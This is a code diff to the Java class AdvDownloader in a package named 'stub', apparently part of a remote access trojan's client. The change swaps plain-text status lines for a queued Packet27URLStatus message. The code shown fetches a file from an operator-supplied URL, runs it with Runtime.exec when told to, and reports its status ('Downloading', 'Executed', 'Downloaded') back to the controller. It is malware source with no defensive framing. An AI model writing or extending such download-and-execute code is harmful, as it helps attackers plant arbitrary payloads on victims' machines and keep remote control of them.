@@ -7,6 +7,8 @@ import java.net.URL;
 import java.net.URLConnection;
 import java.util.Random;
 
+import com.redpois0n.stub.packets.outgoing.Packet27URLStatus;
+
 public class AdvDownloader extends Thread {
 
 	public String url;
@@ -21,9 +23,7 @@ public class AdvDownloader extends Thread {
 
 	public void run() {
 		try {
-			Connection.writeLine("URLSTAT");
-			Connection.writeLine(url);
-			Connection.writeLine("Downloading");
+			Connection.addToSendQueue(new Packet27URLStatus(url, "Downloading"));
 			try {
 				File file = null;
 
@@ -69,13 +69,9 @@ public class AdvDownloader extends Thread {
 
 				if (this.exec) {
 					Runtime.getRuntime().exec(new String[] { file.getAbsolutePath() });
-					Connection.writeLine("URLSTAT");
-					Connection.writeLine(url);
-					Connection.writeLine("Executed");
+					Connection.addToSendQueue(new Packet27URLStatus(url, "Executed"));
 				} else {
-					Connection.writeLine("URLSTAT");
-					Connection.writeLine(url);
-					Connection.writeLine("Downloaded");
+					Connection.addToSendQueue(new Packet27URLStatus(url, "Downloaded"));
 				}
 			} finally {
 
